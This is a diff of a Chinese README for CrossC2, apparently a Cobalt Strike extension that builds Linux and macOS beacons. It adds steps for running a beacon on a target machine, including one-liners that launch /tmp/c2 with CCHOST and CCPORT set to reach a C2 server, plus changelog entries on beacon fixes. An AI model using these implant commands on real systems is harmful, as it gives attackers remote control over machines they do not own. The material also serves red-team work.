@@ -94,6 +94,13 @@ genCrossC2.Win.exe 需要依赖的两个文件为`ucrtbased.dll`,`vcruntime140d.
 
 1. 下载CrossC2Kit, 添加`CrossC2Kit_Loader.cna`, 包含内存加载等其它功能。(`cs4.x`版本文件管理功能缺失，必须使用此Loader来重新启用文件管理)
 
+> 运行beacon的方法:
+
+* 在目标上运行CrossC2插件生成的一键上线脚本
+* 上传beacon至目标机器后进行赋权运行
+* 为beacon设定工作目录并运行: `export CCPATH=/opt/ && /tmp/c2`
+* 为beacon临时指定协议库并运行: `/tmp/c2 /tmp/c2-rebind.so`
+* 为beacon临时设定C2配置: `export CCHOST=127.0.0.1 && export CCPORT=443 && /tmp/c2`
 
 
 ## 安装参考文档: [📖 Wiki](https://gloxec.github.io/CrossC2/zh_cn/usage/)
@@ -215,6 +222,35 @@ genCrossC2.Win.exe 需要依赖的两个文件为`ucrtbased.dll`,`vcruntime140d.
 </details>
 
 # ChangeLog
+
+## release v2.2.4 - stable :
+* -修复 v2.2.3 的上线问题 #84 #85
+* +支持 Linux支持从procfs中获取进程列表信息
+
+## release v2.2.3 :
+* -修复 修复32位Linux下打开文件管理器时beacon退出的bug
+* -修复 修复多指令合并任务中`bcd`、`bls`、`bupload`等函数解析错误问题，现在可以处理与windows beacon相同的cna脚本  #81
+* +支持 添加两个环境变量用于临时设置beacon连接的C2地址 (`CCHOST` & `CCPORT`)
+
+> export CCHOST=127.0.0.1 && export CCPORT=443  && /tmp/c2
+
+* +支持 添加bupload函数支持 https://github.com/gloxec/CrossC2/issues/81#issuecomment-841068719
+
+## release v2.2.2 - stable:
+* -修复 修复加载自定义通信协议库时导致beacon无法启动的一些bug
+* +支持 新增两种强制指定beacon加载自定义通信协议库的运行方式
+
+> 1. export CCPATH=/opt/  && /tmp/c2
+(为beacon强制设定具有权限的工作目录, 例如 `/opt/`)
+> 2. /tmp/c2 /tmp/c2-rebind.so
+(为beacon强制指定通信协议库)
+
+## release v2.2.1 :
+* -修复 修复文件下载速度过慢的问题（现已达到满速）
+* -修复 修复同时下载多个文件出现的问题（使用`downloads`命令查看进度）
+* -修复 修复低版本内核系统上`/tmp/`目录文件权限默认没有执行权限，导致`beacon`无法启动的问题
+* -修复 修复低版本内核系统上`beacon`反复上线时，资源被占用导致失败的问题
+* -修复 修复文件落地时在低版本内核系统时遇到名称冲突，无法运行的问题
 
 ## release v2.2 :
 
